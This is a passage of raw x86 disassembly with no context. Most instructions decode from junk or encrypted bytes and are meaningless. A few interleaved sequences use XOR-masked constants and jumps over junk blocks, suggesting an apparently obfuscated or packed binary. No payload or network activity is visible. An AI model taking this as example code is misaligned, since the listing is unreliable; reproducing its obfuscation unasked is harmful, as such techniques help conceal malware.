  415066:	pop    ebx
  415067:	pop    edx
  415068:	pop    esp
  415069:	and    al,0x5
  41506b:	sub    ecx,edi
  41506d:	ins    DWORD PTR es:[edi],dx
  41506e:	in     al,dx
  41506f:	daa    
  415070:	ret    0xffdb
  415073:	cwde   
  415074:	push   esp
  415075:	(bad)  
  415076:	jecxz  0x41504b
  415078:	jg     0x41504f
  41507a:	fdivr  QWORD PTR [edx-0x5b]
  41507d:	shl    BYTE PTR [ebp-0x80],0x47
  415081:	and    DWORD PTR [edx-0x28],ebp
  415084:	xchg   ebx,eax
  415085:	adc    eax,0xd62463e0
  41508a:	jge    0x4150b3
  41508c:	sbb    al,al
  41508e:	jge    0x415057
  415090:	and    DWORD PTR [eax+0xc9de1ef],edx
  415096:	xor    esi,ecx
  415098:	inc    ebx
  415099:	test   eax,0xf10e139e
  41509e:	dec    edi
  41509f:	xchg   esi,eax
  4150a0:	push   es
  4150a1:	std    
  4150a2:	and    al,0xce
  4150a4:	scas   al,BYTE PTR es:[edi]
  4150a5:	xor    BYTE PTR [edx-0x58e917da],al
  4150ab:	sti    
  4150ac:	push   ds
  4150ad:	and    eax,0x8e2d89bb
  4150b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4150b3:	mov    eax,0x5c321c5f
  4150b8:	mov    dl,0xd2
  4150ba:	aam    0x85
  4150bc:	mov    eax,ds:0x16febb76
  4150c1:	cwde   
  4150c2:	popa   
  4150c3:	jl     0x41512a
  4150c5:	push   esp
  4150c6:	ins    DWORD PTR es:[edi],dx
  4150c7:	push   ecx
  4150c8:	ja     0x4150bc
  4150ca:	call   0xd4a6:0xee5b2601
  4150d1:	and    ebp,DWORD PTR ss:[ebx+ebx*2+0x65]
  4150d6:	inc    ebp
  4150d7:	jno    0x415071
  4150d9:	out    dx,eax
  4150da:	inc    esi
  4150db:	mov    ecx,0x130a1c95
  4150e0:	pop    esp
  4150e1:	pop    eax
  4150e2:	or     DWORD PTR [esi-0x784e5191],0x36
  4150e9:	addr16 (bad) 
  4150eb:	scas   eax,DWORD PTR es:[edi]
  4150ec:	add    bl,dh
  4150ee:	fwait
  4150ef:	lods   al,BYTE PTR ds:[esi]
  4150f0:	xor    DWORD PTR [eax],edi
  4150f2:	rol    BYTE PTR [ecx],0x95
  4150f5:	adc    eax,0xf85fcc03
  4150fa:	pop    ecx
  4150fb:	xchg   ebp,eax
  4150fc:	mov    edx,0x9974d21d
  415101:	jae    0x41513f
  415103:	shl    DWORD PTR [eax+0x529e5995],cl
  415109:	pop    eax
  41510a:	addr16 push 0x41
  41510d:	jo     0x41515d
  41510f:	aaa    
  415110:	cwde   
  415111:	ins    DWORD PTR es:[edi],dx
  415112:	mov    ebx,0x24c60935
  415117:	xchg   edi,eax
  415118:	sbb    al,0xce
  41511a:	inc    edx
  41511b:	pop    esp
  41511c:	not    DWORD PTR [esp+esi*8+0x6ce53e13]
  415123:	xor    edx,ecx
  415125:	or     ebx,ecx
  415127:	push   0xa76f0fd3
  41512c:	sbb    DWORD PTR [ebx+0x4bccbad4],esp
  415132:	xchg   esp,eax
  415133:	fsub   DWORD PTR [edi+0x17]
  415136:	inc    esp
  415137:	in     eax,0x26
  415139:	(bad)
  41513d:	mov    eax,ds:0xaff2bb7
  415142:	shl    DWORD PTR [esi-0x2b42bd43],cl
  415148:	je     0x4151bd
  41514a:	int    0xee
  41514c:	stos   DWORD PTR es:[edi],eax
  41514d:	inc    esi
  41514e:	add    DWORD PTR [ecx+0x17],ecx
  415151:	aam    0x93
  415153:	lock rcl DWORD PTR [edx],1
  415156:	test   edi,eax
  415158:	jb     0x415197
  41515a:	fwait
  41515b:	ins    BYTE PTR es:[edi],dx
  41515c:	push   esi
  41515d:	xchg   ebx,eax
  41515e:	and    al,0x35
  415160:	mov    ah,BYTE PTR [ebp+0x39]
  415163:	dec    ebp
  415164:	push   edx
  415165:	mov    al,ds:0xcecefeab
  41516a:	jecxz  0x41519f
  41516c:	adc    BYTE PTR [ebx+0x4981cc97],0xcb
  415173:	sub    eax,DWORD PTR [ecx]
  415175:	sbb    DWORD PTR [ebx+0x12e48f34],0xffffffe1
  41517c:	popa   
  41517d:	outs   dx,BYTE PTR ds:[esi]
  41517e:	into   
  41517f:	sub    esp,eax
  415181:	mov    DWORD PTR [ebp-0x24],esp
  415184:	mov    eax,DWORD PTR [ebp-0x4]
  415187:	mov    ecx,0x7510855
  41518c:	xor    eax,ecx
  41518e:	mov    edx,0x32729c
  415193:	jmp    0x415477
  415198:	mov    edi,0x35df28be
  41519d:	jne    0x4151f6
  41519f:	pop    esi
  4151a0:	push   ebx
  4151a2:	(bad)  
  4151a3:	fst    DWORD PTR [esi]
  4151a5:	xor    eax,0x5edc521
  4151aa:	jg     0x41521c
  4151ac:	mov    ecx,0x6b70707e
  4151b1:	mov    eax,ds:0xf4d6c812
  4151b6:	mov    DWORD PTR [ebx-0x763bff4d],eax
  4151bc:	adc    ebx,DWORD PTR [ecx-0x5]
  4151bf:	xor    al,0xaf
  4151c1:	xchg   ebx,eax
  4151c2:	in     eax,dx
  4151c3:	push   ss
  4151c4:	aam    0xe1
  4151c6:	int    0xf7
  4151c8:	mov    bl,0xe4
  4151ca:	fldenv [edi+0x2e807b06]
  4151d0:	xchg   esi,eax
  4151d1:	cli    
  4151d2:	sub    DWORD PTR [esp+ebp*1],esp
  4151d5:	mov    DWORD PTR [ebp+0x62bdb283],edi
  4151db:	sbb    DWORD PTR fs:[ebx+0x638ae993],esp
  4151e2:	jecxz  0x41523b
  4151e4:	out    0x98,al
  4151e6:	ja     0x4151ae
  4151e8:	(bad)  
  4151e9:	(bad)  
  4151ea:	clc    
  4151eb:	not    DWORD PTR cs:[eax]
  4151ee:	mov    cl,0x1f
  4151f0:	dec    esi
  4151f1:	sbb    BYTE PTR [ecx-0x27],dh
  4151f4:	je     0x41520c
  4151f6:	fbstp  TBYTE PTR [edi+0xcf6642d]
  4151fc:	fadd   QWORD PTR [ebx-0x1748ba34]
  415202:	jbe    0x41527e
  415204:	fild   DWORD PTR [eax+0x195ea39f]
  41520a:	pop    eax
  41520b:	scas   eax,DWORD PTR es:[edi]
  41520c:	sub    BYTE PTR [ebp-0x10],0xe0
  415210:	jmp    0x41520b
  415212:	iret   
  415213:	add    bl,BYTE PTR ds:0xce3e347a
  415219:	ds dec esp
  41521b:	out    0xf0,al
  41521d:	jmp    0xbb00:0x6711e3d6
  415224:	push   0xffffffd3
  415226:	adc    eax,0x883a399f
  41522b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41522c:	and    DWORD PTR ds:0x85b7021e,ebx
  415232:	xor    DWORD PTR [ecx+0x70],ebp
  415235:	mov    cl,0x51
  415237:	lods   eax,DWORD PTR ds:[esi]
  415238:	aam    0x5f
  41523a:	(bad)  
  41523b:	pushf  
  41523c:	dec    ebx
  41523d:	adc    cl,cl
  41523f:	mov    edx,gs
  415241:	or     eax,0x4f074956
  415246:	or     eax,0x9d192891
  41524b:	pushf  
  41524c:	aas    
  41524d:	popf   
  41524e:	jg     0x4151fd
  415250:	mov    ebx,0x16010508
  415255:	dec    ebx
  415256:	outs   dx,BYTE PTR ds:[esi]
  415257:	addr16 mov ebp,ecx
  41525a:	hlt    
  41525b:	inc    esp
  41525c:	mov    ch,0x52
  41525e:	mov    edi,0x6c373a8
  415263:	nop
  415264:	pusha  
  415265:	push   edi
  415266:	push   ss
  415267:	jg     0x41527f
  415269:	jge    0x415282
  41526b:	dec    ebx
  41526d:	les    ebx,FWORD PTR [edi+0x30]
  415270:	add    ah,BYTE PTR [edx+0x3c]
  415273:	jnp    0x415240
  415275:	adc    BYTE PTR [ecx-0x5cf3efd3],bh
  41527b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41527c:	xchg   ecx,eax
  41527d:	pushf  
  41527e:	xlat   BYTE PTR ds:[ebx]
  41527f:	mov    BYTE PTR [edx-0x2a],cl
  415282:	xor    al,0xc
  415284:	js     0x41529f
  415286:	imul   ebp,esi,0xcd7a193
  41528c:	sub    bl,BYTE PTR ds:0xcbc3bdd
  415292:	sbb    edi,DWORD PTR [esi-0x460fb612]
  415298:	dec    ecx
  415299:	sub    bl,ah
  41529b:	in     eax,0xf
  41529d:	adc    al,0xb9
  41529f:	sbb    ebp,0x764a0a97
  4152a5:	mov    al,0x56
  4152a7:	les    esi,FWORD PTR [ebp-0x5e9528c]
  4152ad:	sbb    al,0x8f
  4152af:	mov    ah,0x95
  4152b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4152b2:	ret    
  4152b3:	push   eax
  4152b4:	mov    BYTE PTR [edi],bh
  4152b6:	cdq    
  4152b7:	stos   BYTE PTR es:[edi],al
  4152b8:	dec    ebx
  4152b9:	xchg   ebx,eax
  4152ba:	xor    ecx,edi
  4152bc:	iret   
  4152bd:	scas   eax,DWORD PTR es:[edi]
  4152be:	sbb    eax,0xfc75ef8d
  4152c3:	mov    BYTE PTR [eax-0x71],dh
  4152c6:	fcmovnu st,st(7)
  4152c8:	int3   
  4152c9:	add    dh,ch
  4152cb:	ds xchg esp,eax
  4152cd:	test   BYTE PTR [ecx+0x54231139],ch
  4152d3:	call   0x3592f087
  4152d8:	xchg   bh,bl
  4152da:	mov    ecx,0xf941ea1a
  4152df:	sbb    al,0x73
  4152e1:	cmp    ebp,0x34f645ac
  4152e7:	iret   
  4152e8:	adc    DWORD PTR [ebp-0x1331f26d],esi
  4152ee:	cdq    
  4152ef:	mov    ah,BYTE PTR [bp+di-0x228a]
  4152f4:	dec    ecx
  4152f5:	mov    esi,0x29fbe53
  4152fa:	scas   eax,DWORD PTR es:[edi]
  4152fb:	add    al,0x33
  4152fd:	in     al,0xd2
  4152ff:	mov    bh,0x44
  415301:	sub    edx,DWORD PTR [esi-0x4662b3c1]
  415307:	arpl   WORD PTR [eax-0x1de5758c],si
  41530d:	int    0x6b
  41530f:	or     BYTE PTR [ecx+0x51c41b3],0xfb
  415316:	popf   
  415317:	ds lahf 
  415319:	pushf  
  41531a:	push   eax
  41531b:	shl    BYTE PTR [ebx],1
  41531d:	sub    eax,0x72685341
  415322:	xchg   ebp,eax
  415323:	shl    ah,0x4
  415326:	xchg   esp,eax
  415327:	push   ebx
  415328:	add    dh,BYTE PTR [eax]
  41532a:	jns    0x4152b1
  41532c:	ficomp DWORD PTR [eax-0x71]
  41532f:	imul   eax,DWORD PTR [ecx],0xffffffb6
  415332:	mov    ah,0x82
  415334:	pop    ebx
  415335:	cmp    al,0x16
  415337:	sbb    DWORD PTR [edi],0x9c61fdf3
  41533d:	pop    edi
  41533e:	call   0x1e61:0xee7a2b07
  415345:	pop    esp
  415346:	and    eax,0xec463104
  41534b:	jbe    0x4152e7
  41534d:	push   es
  41534e:	mov    esi,0x9f3e0de4
  415353:	into   
  415354:	or     al,0xff
  415356:	repnz call 0x760e:0xeb4385df
  41535e:	mov    dl,0x70
  415360:	and    esp,eax
  415362:	or     DWORD PTR [edx+0x56],esi
  415365:	lea    ebp,[esi-0x7b74701f]
  41536b:	in     eax,dx
  41536c:	jmp    0x41537f
  41536e:	scas   eax,DWORD PTR es:[edi]
  41536f:	xchg   ecx,eax
  415370:	mov    cl,0xbd
  415372:	fcomp  DWORD PTR [ebx]
  415374:	mov    esp,0xab2a358a
  415379:	fwait
  41537a:	call   0x7496ebc7
  41537f:	xchg   esp,eax
  415380:	xchg   ebx,eax
  415381:	cs cmp al,0xe7
  415384:	pop    ecx
  415385:	sbb    al,0xfd
  415387:	xor    al,0x50
  415389:	jmp    0xabfdb75b
  41538e:	or     al,0xc8
  415390:	dec    edi
  415391:	fild   QWORD PTR [edx]
  415393:	xchg   esp,eax
  415394:	jb     0x4153e1
  415396:	xchg   DWORD PTR [ecx+edi*2-0x2d],eax
  41539a:	fdiv   DWORD PTR [esi]
  41539c:	mov    ah,0x92
  41539e:	inc    ebp
  41539f:	je     0x41538a
  4153a1:	mov    esi,0xb4587bcd
  4153a6:	push   ecx
  4153a7:	es pop es
  4153a9:	mov    al,ds:0x52daacfc
  4153ae:	sbb    dh,ah
  4153b0:	jle    0x415368
  4153b2:	xchg   ecx,eax
  4153b3:	aaa    
  4153b4:	jge    0x415375
  4153b6:	or     bl,BYTE PTR [edi-0x5b]
  4153b9:	jmp    0x415411
  4153bb:	jg     0x4153d9
  4153bd:	lds    esi,FWORD PTR [eax-0x2dcbd3cc]
  4153c3:	xor    edx,DWORD PTR [esi-0x64]
  4153c6:	ficomp DWORD PTR [edx-0x49698b73]
  4153cc:	jg     0x415393
  4153ce:	mov    WORD PTR [eax-0x4a2c6be8],ds
  4153d4:	push   es
  4153d5:	enter  0x97cb,0x4a
  4153d9:	sbb    al,BYTE PTR [edx+ebx*4+0x11a860df]
  4153e0:	imul   esp,DWORD PTR [edi-0x343e94fc],0x31
  4153e7:	and    bh,BYTE PTR [edx-0x19]
  4153ea:	shl    DWORD PTR [edx],0xe6
  4153ed:	test   al,0x54
  4153ef:	sbb    al,0x2e
  4153f1:	cwde   
  4153f2:	idiv   BYTE PTR [esi-0x5571d951]
  4153f8:	jb     0x415424
  4153fa:	push   edx
  4153fb:	pop    edi
  4153fc:	sbb    eax,DWORD PTR [ebx+ebx*8-0x6a]
  415400:	mov    ebx,0x110504cb
  415405:	or     eax,0xcb80998e
  41540a:	or     DWORD PTR [ecx-0x78],esp
  41540d:	out    dx,al
  41540e:	or     BYTE PTR [ebp+0x13e2e537],0xf9
  415415:	add    BYTE PTR [esp+ecx*1+0x72cbb211],bl
  41541c:	and    BYTE PTR [ecx-0x2e878211],ah
  415422:	cmc    
  415423:	lods   al,BYTE PTR ds:[esi]
  415424:	(bad)  
  415425:	(bad)  
  415426:	popa   
  415427:	jo     0x415491
  415429:	mov    cl,0x8f
  41542b:	icebp  
  41542c:	imul   esp,DWORD PTR [esi-0x42],0xa104311b
  415433:	retf   
  415434:	scas   eax,DWORD PTR es:[edi]
  415435:	xor    DWORD PTR [ecx-0x39f36294],edi
  41543b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41543c:	mov    bh,0x99
  41543e:	and    eax,0xdeece02c
  415443:	and    al,0x8
  415445:	scas   eax,DWORD PTR es:[edi]
  415446:	retf   0xf707
  415449:	iret   
  41544a:	adc    al,ch
  41544c:	mov    ebx,0x9443bd0b
  415451:	xor    eax,0x7dd905af
  415456:	repnz mov eax,0xa210e994
  41545c:	dec    ebx
  41545d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41545e:	sub    bh,BYTE PTR [ebp+0x66521202]
  415464:	pop    eax
  415465:	pop    esi
  415466:	mov    ebx,0xb712408c
  41546b:	mov    dh,0xd1
  41546d:	push   ecx
  41546e:	fnstcw WORD PTR [edx]
  415470:	outs   dx,DWORD PTR ds:[esi]
  415471:	mov    esp,0xfacadbee
  415476:	mov    ch,0x3
  415478:	ret    0x4589
  41547b:	or     BYTE PTR [ebx-0x3ecc17bb],cl
  415481:	add    eax,edx
  415483:	mov    edx,DWORD PTR [ebp+0x14]
  415486:	imul   eax,DWORD PTR [edx]
  415489:	mov    edx,DWORD PTR [ebp-0x4]
  41548c:	xor    edx,ecx
  41548e:	mov    ecx,DWORD PTR [ebp+0x8]
  415491:	lea    ecx,[edx+ecx*1+0x32729c]
  415498:	cmp    ecx,eax
  41549a:	je     0x416385
  4154a0:	mov    edi,DWORD PTR [ebp-0x18]
  4154a3:	mov    eax,DWORD PTR [ebp+0x8]
  4154a6:	mov    edx,DWORD PTR [ebp+0x14]
  4154a9:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  4154ad:	mov    ecx,0x7510855
  4154b2:	xor    edx,edx
  4154b4:	xor    edi,ecx
  4154b6:	jmp    0x41579a
  4154bb:	sub    dh,cl
  4154bd:	sub    BYTE PTR [ecx+0x71b159f7],bl
  4154c3:	xchg   esi,edx
  4154c5:	push   ebx
  4154c6:	mov    ch,0xec
  4154c8:	jo     0x41545b
  4154ca:	sub    DWORD PTR [esi],esi
  4154cc:	add    bh,BYTE PTR [edi+0x70]
  4154cf:	mov    ecx,0x5f70707e
  4154d4:	enter  0xb511,0xc1
  4154d8:	popf   
  4154d9:	fistp  WORD PTR [eax-0x2d]
  4154dc:	dec    ecx
  4154dd:	pop    esp
  4154de:	sub    edx,DWORD PTR [esi-0x4df75e24]
  4154e4:	aas    
  4154e5:	gs or  eax,0x7b1edea3
  4154eb:	cli    
  4154ec:	lahf   
  4154ed:	ds (bad) 
  4154ef:	out    dx,al
  4154f0:	(bad)  
  4154f1:	bound  edi,QWORD PTR [eax+0x15fa5426]
  4154f7:	sbb    al,0x43
  4154f9:	sti    
  4154fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4154fb:	adc    esi,DWORD PTR [edx]
  4154fd:	jmp    0x21b4cb2f
  415502:	fistp  QWORD PTR [esi-0x6e40ed3c]
  415508:	clc    
  415509:	xor    bl,cl
  41550b:	mov    edx,0xee2c235a
  415510:	icebp  
  415511:	sbb    BYTE PTR [ebx],0xa9
  415514:	xor    eax,edx
  415516:	scas   eax,DWORD PTR es:[edi]
  415517:	js     0x4154c8
  415519:	out    dx,al
  41551a:	imul   esi,DWORD PTR [edi+0x25818b77],0x16257ea8
  415524:	mov    BYTE PTR [ebx+0x638cfb6c],dl
  41552a:	push   ds
  41552b:	mov    eax,ds:0x18f398ff
  415530:	push   0x55376b51
  415535:	fadd   st(7),st
  415537:	dec    edi
  415538:	into   
  415539:	push   ebp
  41553a:	mov    BYTE PTR [ebx-0x1e],0x81
  41553e:	inc    edi
  41553f:	aad    0xb7
  415541:	cdq    
  415542:	adc    ebx,esi
  415544:	sub    al,0xb6
  415546:	mov    dl,0x56
  415548:	scas   al,BYTE PTR es:[edi]
  415549:	adc    cl,BYTE PTR [edi]
  41554b:	add    esp,ebx
  41554d:	mov    ah,0x91
  41554f:	pop    ss
  415550:	dec    eax
  415551:	in     al,0x1a
  415553:	aaa    
  415554:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415555:	mov    DWORD PTR [ebx],edx
  415557:	jno    0x4154fb
  415559:	xabort 0x5d
  41555c:	cli    
  41555d:	add    bh,BYTE PTR [edx+0x6d]
  415560:	test   dl,ah
  415562:	mov    cl,BYTE PTR [ebx+0x7110ca4d]
  415568:	dec    edx
  415569:	popf   
  41556a:	jno    0x4155de
  41556c:	mov    dh,0x30
  41556e:	data16 mov WORD PTR [edi],fs
  415571:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415572:	(bad)  
  415574:	jecxz  0x4155eb
  415576:	push   0x3b15084d
  41557b:	mov    dl,0x9b
  41557d:	cmp    BYTE PTR [ecx+eiz*4+0x2918d8ab],bl
  415584:	pop    ebp
  415585:	pop    DWORD PTR [ebx]
  415587:	call   0xa48:0xdeb69dd5
  41558e:	mov    ds:0xc541ae33,al
  415593:	push   edi
  415594:	lahf   
  415595:	mov    ds:0xa6e658db,al
  41559a:	cmc    
  41559b:	fwait
  41559c:	xlat   BYTE PTR ds:[ebx]
  41559d:	or     BYTE PTR [ebx],ch
  41559f:	je     0x415611
  4155a1:	in     eax,dx
  4155a2:	mov    dh,0x3d
  4155a4:	add    BYTE PTR [esi+0x18],dh
  4155a7:	hlt    
  4155a8:	or     eax,0x4e2ab4c3
  4155ad:	xchg   ecx,eax
  4155ae:	jl     0x415554
  4155b0:	mov    ebp,0xc4507711
  4155b5:	adc    al,0xd
  4155b7:	adc    al,0x75
  4155b9:	dec    ebx
  4155ba:	mov    ds:0x6deb7bc,eax
  4155bf:	dec    ebx
  4155c0:	dec    edx
  4155c1:	mov    BYTE PTR [eax],al
  4155c3:	adc    DWORD PTR [edx],0x60
  4155c6:	or     al,0x86
  4155c8:	lods   eax,DWORD PTR ds:[esi]
  4155c9:	cmc    
  4155ca:	(bad)  
  4155cb:	(bad)  
  4155cd:	cmovge esp,edi
  4155d0:	(bad)  
  4155d1:	cmp    al,0x94
  4155d3:	mov    ebp,0xa8b6b7fc
  4155d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4155d9:	mov    DWORD PTR [edx],ebx
  4155db:	repnz std 
  4155dd:	fmul   DWORD PTR [edi+edx*1-0x37538f40]
  4155e4:	xchg   edi,eax
  4155e5:	inc    esi
  4155e6:	pop    esi
  4155e7:	xchg   ebx,eax
  4155e8:	in     eax,dx
  4155e9:	add    edi,DWORD PTR [esi+ebx*1-0x27]
  4155ed:	sub    eax,0xe40b2459
  4155f2:	jne    0x41561f
  4155f4:	mov    ebx,0xc6ec7896
  4155f9:	mov    ds,WORD PTR [ebx]
  4155fb:	popa   
  4155fc:	dec    edi
  4155fd:	sbb    eax,0x9a24e8e
  415602:	pop    esi
  415603:	addr16 mov eax,ds:0x43dc
  415607:	stc    
  415608:	mov    ebp,0xb75a1e4a
  41560d:	sbb    bl,dh
  41560f:	cdq    
  415610:	outs   dx,BYTE PTR ds:[esi]
  415611:	(bad)  
  415612:	sti    
  415613:	ret    
  415614:	stos   DWORD PTR es:[edi],eax
  415615:	ficom  WORD PTR [edx+0x33]
  415618:	stos   BYTE PTR es:[edi],al
  415619:	das    
  41561a:	mov    ebx,0xb493fd56
  41561f:	jl     0x41562c
  415621:	and    BYTE PTR [ebx+0x2db06cd8],ch
  415627:	sti    
  415628:	fwait
  415629:	or     bh,BYTE PTR [esi+0x13]
  41562c:	and    eax,0xbbb74c59
  415631:	mov    eax,0xb1792f39
  415636:	addr16 jns 0x4155ff
  415639:	xor    esi,DWORD PTR [eax-0x717c5386]
  41563f:	mov    esp,0x71bc612c
  415644:	xlat   BYTE PTR ds:[ebx]
  415645:	cmp    edx,edi
  415647:	or     edi,DWORD PTR [ebx+0x571151]
  41564d:	sahf   
  41564e:	pop    edx
  41564f:	shr    DWORD PTR [eax+0x3c],0xb7
  415653:	push   edi
  415654:	std    
  415655:	xor    al,0x6f
  415657:	popf   
  415658:	jno    0x4155f5
  41565a:	xor    al,0x22
  41565c:	or     DWORD PTR [edi],esi
  41565e:	pop    ebp
  41565f:	or     DWORD PTR [edx+0x235cba9f],edx
  415665:	repnz xor DWORD PTR [ebx+0x528addf5],ebx
  41566c:	lods   al,BYTE PTR ds:[esi]
  41566d:	mov    bl,0xd6
  41566f:	pop    esi
  415670:	cmp    edi,esp
  415672:	jg     0x415664
  415674:	mov    ecx,0x6522c19a
  415679:	cs xchg DWORD PTR gs:[esi],edx
  41567d:	cwde   
  41567e:	xchg   ecx,eax
  41567f:	and    ch,BYTE PTR [esi-0x5d]
  415682:	pop    ecx
  415683:	dec    edi
  415684:	out    0xb,eax
  415686:	xor    ah,ch
  415688:	bound  eax,QWORD PTR [esi+ebp*8+0x75cfb18f]
  41568f:	int    0x85
  415691:	cli    
  415692:	icebp  
  415693:	mov    cl,BYTE PTR [esi-0x4a]
  415696:	mov    edx,gs
  415698:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415699:	ss and eax,0x5c91494b
  41569f:	adc    dl,BYTE PTR [esp+eax*4-0x66]
  4156a3:	ret    
  4156a4:	lods   eax,DWORD PTR ds:[esi]
  4156a5:	dec    esp
  4156a6:	mov    ds:0xe8a30584,al
  4156ab:	scas   al,BYTE PTR es:[edi]
  4156ac:	xchg   esi,eax
  4156ad:	xchg   ebp,eax
  4156ae:	add    al,0xc9
  4156b0:	(bad)  
  4156b1:	out    0x21,al
  4156b3:	pop    esp
  4156b4:	jae    0x415655
  4156b6:	test   al,0x19
  4156b8:	dec    esp
  4156b9:	sbb    ah,0x2d
  4156bc:	lahf   
  4156bd:	pop    eax
  4156be:	pop    eax
  4156bf:	mov    ds:0x72a0ff27,eax
  4156c4:	(bad)  
  4156c5:	xor    eax,0x8c535ff
  4156ca:	mov    es,WORD PTR [edx+0xeb718f0]
  4156d0:	mov    eax,0x3645bf3c
  4156d5:	or     esi,ebx
  4156d7:	push   ds
  4156d8:	jmp    0x9a48:0xc1f0fd5b
  4156df:	jb     0x4156d9
  4156e1:	push   ecx
  4156e2:	call   0x874b0a6
  4156e7:	and    ah,BYTE PTR [ecx]
  4156e9:	mov    ch,0xd4
  4156eb:	div    DWORD PTR [eax+0x36]
  4156ee:	or     BYTE PTR ds:0x2f64156b,ch
  4156f4:	sbb    al,0x2e
  4156f6:	imul   BYTE PTR [ebp+0x77874aa3]
  4156fc:	ins    DWORD PTR es:[edi],dx
  4156fd:	ins    DWORD PTR es:[edi],dx
  4156fe:	aam    0x9f
  415700:	push   ds
  415701:	je     0x415731
  415703:	cwde   
  415704:	inc    edi
  415705:	scas   eax,DWORD PTR es:[edi]
  415706:	fistp  WORD PTR [ecx+0x64]
  415709:	aam    0xe
  41570b:	jge    0x415789
  41570d:	jbe    0x4156ff
  41570f:	iret   
  415710:	push   eax
  415711:	inc    eax
  415712:	js     0x41577d
  415714:	mov    eax,ds:0x11c160ec
  415719:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41571a:	sar    al,1
  41571c:	jb     0x4156ce
  41571e:	push   ds
  41571f:	cmp    eax,0x7db2476e
  415724:	push   esi
  415725:	cld    
  415726:	in     al,dx
  415727:	mov    esi,0x603628e4
  41572c:	adc    al,0xd7
  41572e:	shr    BYTE PTR [ebp-0x5],1
  415731:	inc    esi
  415732:	xlat   BYTE PTR ds:[ebx]
  415733:	xchg   ebx,eax
  415734:	xor    ecx,eax
  415736:	jo     0x415711
  415738:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415739:	cmp    bl,BYTE PTR [esp+ecx*2+0x51d03987]
  415740:	pushf  
  415741:	xor    eax,DWORD PTR [ebp-0x42]
  415744:	fld    TBYTE PTR [ebx-0x23003c69]
  41574b:	add    eax,0xdfdfda61
  415750:	pushf  
  415751:	(bad)  
  415752:	mov    ecx,0x5051b314
  415757:	test   DWORD PTR [edx],0x772f9577
  41575d:	shl    BYTE PTR [ebp+0x90db75b],cl
  415763:	mov    WORD PTR [ecx-0x7982027a],ds
  415769:	inc    esi
  41576a:	in     al,dx
  41576b:	add    bh,BYTE PTR [esi+0x21]
  41576e:	out    0xda,al
  415770:	mov    ebx,DWORD PTR [esi+0x55]
  415773:	or     esi,DWORD PTR [ecx]
  415775:	mov    cs,WORD PTR [edi]
  415777:	dec    DWORD PTR [eax+eiz*8+0x9ed53c1]
  41577e:	sti    
  41577f:	lods   eax,DWORD PTR ds:[esi]
  415780:	setp   BYTE PTR [ebp+0x14]
  415784:	push   ebx
  415785:	push   esp
  415786:	daa    
  415787:	hlt    
  415788:	jb     0x415770
  41578a:	lea    edi,[eax+0x3e84f6e1]
  415790:	push   0x73
  415792:	sub    DWORD PTR [edx+0x579cac41],edx
  415798:	sbb    al,0x1e
  41579a:	mov    esi,0x32729c
  41579f:	add    edi,esi
  4157a1:	div    edi
  4157a3:	mov    edx,DWORD PTR [ebp-0x4]
  4157a6:	jmp    0x415a8a
  4157ab:	adc    al,0xcd
  4157ad:	inc    esi
  4157ae:	rol    BYTE PTR [ecx+0x51],cl
  4157b1:	xchg   esp,eax
  4157b2:	int    0x7b
  4157b4:	rcl    DWORD PTR [esi],1
  4157b6:	test   BYTE PTR [edx+eiz*1+0x71],ch
  4157ba:	or     al,0x7f
  4157bc:	movq   QWORD PTR [eax-0x47],mm6
  4157c0:	jle    0x415832
  4157c2:	jo     0x41580f
  4157c4:	pop    ebp
  4157c5:	mov    ah,0x82
  4157c7:	int    0xab
  4157c9:	add    eax,0x33bd1896
  4157ce:	loope  0x41576f
  4157d0:	dec    edx
  4157d1:	in     al,0xe8
  4157d3:	mov    cl,0xaf
  4157d5:	push   ss
  4157d6:	or     ah,BYTE PTR [ebp*4+0xc3fba51]
  4157dd:	sub    ebx,DWORD PTR [edi+edx*1]
  4157e0:	inc    ebx
  4157e1:	add    ebp,DWORD PTR [eax-0x43f586ec]
  4157e7:	(bad)  
  4157e8:	cmp    eax,DWORD PTR [ebx]
  4157ea:	mov    edi,0x85d45ef0
  4157ef:	outs   dx,BYTE PTR ds:[esi]
  4157f0:	(bad)  
  4157f1:	cmc    
  4157f2:	shl    BYTE PTR [ebp+0x7d],0xa8
  4157f6:	push   ds
  4157f7:	stos   BYTE PTR es:[edi],al
  4157f8:	mov    dh,0x21
  4157fa:	je     0x41586a
  4157fc:	aaa    
  4157fd:	test   BYTE PTR [edi-0x6da31de9],bl
  415803:	sbb    BYTE PTR [esi-0x4d],al
  415806:	xor    al,0x61
  415808:	push   0xca8d89f7
  41580d:	jecxz  0x4157e0
  41580f:	push   es
  415810:	xchg   edx,eax
  415811:	gs dec edx
  415813:	xchg   BYTE PTR [esp+eiz*2-0x172bd5ec],dh
  41581a:	fcmove st,st(4)
  41581c:	aas    
  41581d:	(bad)  
  41581e:	in     al,0xb2
  415820:	xor    BYTE PTR [esi],0x49
  415823:	(bad)  
  415824:	pop    edi
  415825:	mov    ds:0x12ba634c,eax
  41582a:	ins    DWORD PTR es:[edi],dx
  41582b:	or     bh,cl
  41582d:	cdq    
  41582e:	mov    esp,0x15fc70e5
  415833:	daa    
  415834:	stos   BYTE PTR es:[edi],al
  415835:	add    BYTE PTR [ebp-0x1d950a66],0x46
  41583c:	xchg   esp,eax
  41583d:	fcomi  st,st(0)
  41583f:	(bad)  
  415840:	aad    0xc7
  415842:	or     eax,0xcb7576f7
  415847:	outs   dx,DWORD PTR ds:[esi]
  415848:	push   ebp
  415849:	int3   
  41584a:	popa   
  41584b:	push   esi
  41584c:	push   0x13
  41584e:	mov    eax,ds:0x3de05e7f
  415853:	mov    esp,0x483c500e
  415858:	or     bl,BYTE PTR [eax-0x238fa64]
  41585e:	fistp  DWORD PTR [ebp+0xc]
  415861:	xchg   ebp,eax
  415862:	(bad)  
  415863:	mov    cl,0x45
